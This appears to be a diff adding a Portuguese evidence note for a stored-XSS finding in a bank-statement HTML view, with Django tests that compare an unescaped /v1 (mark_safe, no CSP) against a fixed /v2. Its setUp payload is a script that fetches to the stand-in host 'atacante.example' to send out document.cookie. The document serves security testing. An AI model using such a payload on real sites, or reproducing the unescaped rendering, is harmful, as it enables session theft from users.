@@ -1,0 +1,21 @@
+# Evidência BRECHA-014: XSS armazenado no extrato em HTML.
+# Suíte Django (extrato/tests.py, classe Brecha014XssArmazenadoTest).
+# Validada no job "Serviço de relatórios (Python e Django)" da CI;
+# localmente a suíte exige PostgreSQL.
+
+O Bruno transfere para a Ana e escreve a descrição; a API principal registra o
+lançamento pela rota interna (setUp do teste):
+
+  POST /interno/lancamentos
+  {"conta":100,"data":"2026-10-20",
+   "descricao":"<script>fetch('https://atacante.example/?c='+document.cookie)</script>",
+   "valorCentavos":100}
+
+/v1 (test_v1_entrega_o_script_do_bruno_no_extrato_da_ana): GET /v1/extrato.html
+devolve a descrição sem escape, com o <script> inteiro no corpo, e sem o
+cabeçalho Content-Security-Policy. O script roda no navegador da Ana quando ela
+abre o extrato. A causa é o mark_safe em extrato/views.py (extrato_html_v1).
+
+/v2 (test_v2_escapa_a_descricao_e_proibe_script_pela_csp): o mesmo dado sai
+escapado (&lt;script&gt;), com Content-Security-Policy "default-src 'none'" e
+X-Frame-Options DENY. Nenhum script roda.
